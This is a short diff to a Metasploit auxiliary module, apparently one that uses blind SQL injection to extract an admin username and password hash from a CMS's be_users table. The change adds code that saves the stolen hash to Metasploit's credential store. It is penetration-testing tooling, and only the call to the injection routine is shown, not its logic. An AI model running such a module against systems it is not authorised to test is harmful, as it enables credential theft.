@@ -71,6 +71,14 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Username: #{username}")
     password = blind('password','be_users', 'uid=1', full_charset, digit_charset, patterns)
     print_good("Password Hash: #{password}")
+    connection_details = {
+            module_fullname: self.fullname,
+            username: username,
+            private_data: password,
+            private_type: :nonreplayable_hash,
+            status: Metasploit::Model::Login::Status::UNTRIED,
+        }.merge(service_details)
+    create_credential(connection_details)
   end
 
   def blind(field, table, condition, charset, digit_charset, patterns = {})
